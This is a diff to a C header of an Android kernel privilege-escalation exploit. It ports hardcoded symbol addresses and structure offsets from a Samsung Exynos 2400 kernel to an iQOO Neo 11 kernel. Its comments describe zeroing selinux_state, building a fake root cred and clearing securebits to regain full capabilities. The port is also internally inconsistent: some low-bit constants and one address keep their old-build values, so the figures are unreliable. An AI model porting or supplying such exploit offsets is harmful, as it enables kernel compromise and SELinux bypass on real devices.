@@ -3,8 +3,8 @@
  * payload.  Everything in this file is specific to ONE kernel build; the
  * payload logic in timer.c is generic.
  *
- * Device: Samsung SM-S921N (e1s), Exynos 2400
- * Kernel: 6.1.162-android14-11 (OneUI 9)
+ * Device: IQOO Neo 11 (Snapdragon 8 Elite)
+ * Kernel: 6.6.127-android15 (OriginOS 7)
  *
  * Derived from the device's vmlinux (symtab + disasm).  To port to another
  * kernel, re-derive each group:
@@ -24,7 +24,7 @@
 
 /* do_timer_create+0x9a, return address of the
  * kmem_cache_alloc(posix_timers_cache, GFP_KERNEL|__GFP_ZERO) call. */
-#define STATIC_TIMER_SITE 0xffffffc008194fe0ULL
+#define STATIC_TIMER_SITE 0xffffffc080197fe4
 #define TIMER_SITE_LOW21 0x184fe0ULL
 /* posix_timers_cache object: sizeof(struct k_itimer) on this build.
  * The cache has no SLAB_HWCACHE_ALIGN, so bytes_req == bytes_alloc. */
@@ -35,8 +35,8 @@
 #define CRED_ALLOC 0xc0ULL
 
 /* Link-time addresses (symtab) and BTF field offsets. */
-#define SELINUX_STATE_STATIC 0xffffffc00a5ea4a8ULL
-#define PANIC_ON_WARN_STATIC 0xffffffc00a2eac00ULL
+#define SELINUX_STATE_STATIC 0xffffffc08239a170ULL
+#define PANIC_ON_WARN_STATIC 0xffffffc08214ac0cULL
 
 /*
  * The rb_erase zero-plant aimed at selinux_state: writing 8 zero bytes at
@@ -143,10 +143,10 @@ struct umh_subprocess_info
 #define CREDS_FAST_HASH_STATIC 0xffffffc00a66e9f8ULL
 
 /* cred field offsets. */
-#define CRED_UID_OFF 0x4ULL
+#define CRED_UID_OFF 0x8ULL
 /* securebits: clearing it drops Android's SECURE_NOROOT, so an euid=0
  * exec grants the bounding-set capabilities again. */
-#define CRED_SECUREBITS_OFF 0x24ULL
+#define CRED_SECUREBITS_OFF 0x28ULL
 /* Only capability/selinux/integrity are built in and only SELinux wants a
  * cred blob, so lsm_set_blob_sizes() leaves its offset at 0. */
 #define SELINUX_BLOB_OFF 0x0ULL
@@ -155,14 +155,14 @@ struct umh_subprocess_info
 #define FULLCAP 0x1ffffffffffULL
 
 /* Link-time symbols for the fake cred's refcounted sub-objects. */
-#define ROOT_USER_STATIC 0xffffffc00a310a00ULL
-#define INIT_USER_NS_STATIC 0xffffffc00a310770ULL
-#define INIT_UCOUNTS_STATIC 0xffffffc00a3121d8ULL
-#define INIT_GROUPS_STATIC 0xffffffc00a311d20ULL
+#define ROOT_USER_STATIC 0xffffffc08216f108ULL
+#define INIT_USER_NS_STATIC 0xffffffc08216ee78ULL
+#define INIT_UCOUNTS_STATIC 0xffffffc082170bd8ULL
+#define INIT_GROUPS_STATIC 0xffffffc082170668ULL
 
 /* task_struct::cred and dup_task_struct()'s task_struct_cachep call site. */
 #define OFF_TASK_CRED 0x838ULL
-#define TASK_ALLOC_LOW21 0xacb7cULL
+#define TASK_ALLOC_LOW21 0xac790ULL
 #define TASK_ALLOC_BYTES 0x12c0ULL
 /* Unslid call sites (from vmlinux.elf): prepare_creds' kmem_cache_alloc
  * return address and dup_task_struct's kmem_cache_alloc_node return
